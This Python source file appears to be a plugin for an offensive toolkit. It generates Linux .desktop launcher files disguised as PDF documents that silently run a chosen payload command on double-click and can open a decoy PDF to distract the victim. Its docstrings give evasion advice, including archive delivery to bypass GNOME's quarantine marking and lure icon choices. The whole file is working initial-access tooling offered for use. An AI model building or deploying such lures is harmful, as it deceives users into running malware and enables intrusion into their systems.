"""
Erebus Plugin - XDG Desktop File Trigger
Author: Whispergate
Description: Creates .desktop application launcher files for Linux initial access.

Execution path:
  .desktop → file manager double-click (Nautilus, Dolphin, Thunar, etc.)
             or terminal: gtk-launch <name>

XDG desktop files are the native Linux application shortcut format.  When a user
double-clicks a .desktop file in a graphical file manager they get an "Allow" /
"Run" prompt on newer distros but many corporate Linux deployments still execute
them silently.  Files delivered inside an archive (ZIP/tar) bypass the quarantine
flag that newer GNOME versions apply to downloaded .desktop files.

The file masquerades as a PDF document via Name, Comment, and Icon fields.
"""

import pathlib
import random
import string
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class DesktopTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating XDG .desktop file triggers targeting Linux.

    The desktop file wraps the payload command in a bash -c invocation so that
    the file manager is the parent process, not a terminal.  An optional decoy
    argument opens a PDF alongside execution to distract the victim.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="desktop_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates XDG .desktop application launcher triggers for Linux via file manager double-click",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_desktop_trigger": self.create_desktop_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        print("[Plugin] Desktop Trigger plugin loaded - Supporting Linux XDG .desktop delivery")

    # ================================================================
    # Helpers
    # ================================================================

    @staticmethod
    def _escape_exec(cmd: str) -> str:
        """Escape special characters for the Exec= field per XDG spec."""
        return cmd.replace("\\", "\\\\").replace('"', '\\"').replace("`", "\\`")

    # ================================================================
    # Plugin Functions
    # ================================================================

    def create_desktop_trigger(
        self,
        command: str,
        output_filename: str = "document.desktop",
        payload_dir: Optional[pathlib.Path] = None,
        display_name: str = "PDF Document",
        icon_name: str = "application-pdf",
        decoy_path: str = "",
    ) -> pathlib.Path:
        """
        Create a Linux XDG .desktop file that executes the payload on double-click.

        Args:
            command:         Shell command to run (e.g. './payload').
            output_filename: Output .desktop filename.
            payload_dir:     Directory to write the file into.
            display_name:    Name= field shown in file manager (victim-facing label).
            icon_name:       Icon= field (XDG icon name).  Common lure values:
                             'application-pdf', 'libreoffice-writer', 'folder'.
            decoy_path:      Optional decoy document to open alongside execution.

        Returns:
            pathlib.Path: Path to the created .desktop file.

        ## OPSEC Notes
        Detection Surface:
          - File manager spawns bash as child process - detectable via auditd execve
          - GNOME 42+ marks downloaded .desktop files as untrusted and shows a
            dialog; this is bypassed when files arrive inside a ZIP archive
          - KDE Plasma shows a trust prompt on first execution regardless of source
        Hardening:
          - [MALLEABLE] Set Terminal=false (default here) so no terminal window opens
          - [MALLEABLE] Use a common system icon name matching the lure document type
          - Deliver inside a ZIP/tar to bypass GNOME quarantine marking
        Evasion Maturity: Level 2 (Moderate) - works against KDE/XFCE targets with
          minimal friction; GNOME 42+ requires archive delivery.
        """
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        # Build exec line: background the payload, optionally open decoy
        decoy_part = ""
        if decoy_path:
            escaped_decoy = self._escape_exec(decoy_path)
            decoy_part = f' & xdg-open "{escaped_decoy}"'

        exec_cmd = f'bash -c "{self._escape_exec(command)} >/dev/null 2>&1{decoy_part} &"'

        desktop_content = f"""[Desktop Entry]
Version=1.0
Type=Application
Name={display_name}
Comment=Open document
Icon={icon_name}
Exec={exec_cmd}
Terminal=false
StartupNotify=false
"""
        output_path = payload_dir / output_filename
        output_path.write_text(desktop_content, encoding="utf-8")
        return output_path


# Module-level instance for plugin auto-discovery
_plugin = DesktopTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
